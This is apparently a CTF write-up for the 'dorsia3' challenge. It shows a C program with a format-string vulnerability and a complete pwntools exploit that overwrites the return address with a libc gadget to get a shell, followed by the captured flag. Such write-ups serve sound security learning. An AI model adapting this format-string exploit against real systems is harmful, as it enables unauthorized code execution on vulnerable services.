Directed to the video, but to look at the 3rd card in the video. 

the code is similar to dorsia1 but the fgets length is limited to the size of the buffer -- no overflow here.

They've added a printf at the end which is a clear format string vuln.

```
#include <stdio.h>
#include <stdlib.h>
void main(){
    char a[69];
    printf("%p%p\n", a, system-288);
    fgets(a,69,stdin);
    printf(a, "%s\n");
}
```

This time they've provided the binary and libc for us to play around with.  This time they've compiled it as 32bit elf.  The system-288 is another magic gadget so thats great for us.

Our format string is writing to the 7th var so we will be writing to %7$hn for our exploit.   There is a 1 byte offset to even out our addresses for the exploit so we will always start the string with 1 junk character before our exploit string begins. 

the return address jumps around based on the length of our input so we will have to continue filling out the rest of the buffer to make that return address consistent..

```
from pwn import *

r = remote("dorsia3.wpictf.xyz",31337)

#r = process("./nanoprint")
#gdb.attach(r, '''break fgets''')

output = r.recvline()
magic = int(output.rstrip()[10:], 16)
a = int(output.rstrip()[:10], 16)

high = magic>>16
low = magic & 0xFFFF

#r.sendline('AAAAA' + '%08x.'*7)

payload = ''
payload += 'A'                                          # straighten up our addresses
payload += p32(a+0x71)                                  # first write address, when we have a full buffer, the return address is 0x71 away from a
payload += p32(a+0x73)                                  # second write address, since we are writing with %7$hn we need 0x71+2 away from a
payload += '%' + str(high-9) + 'x'                      # write the high word to offset 8
payload += '%8$hn'
payload += '%' + str((low-high) & 0xFFFF) + 'x'         # write the low word to offset 7
payload += '%7$hn'
payload += 'A'*(69-len(payload))                        # fill in the rest of the buffer to keep our return address location consistent

r.sendline(payload)

r.interactive()
```

Shell:
```
$ ls
flag.txt
nanoprint
run_problem.sh
stdbuf
$ cat flag.txt
WPI{Th3re_is_an_idea_of_4_Pa7rick_BatemaN}
```

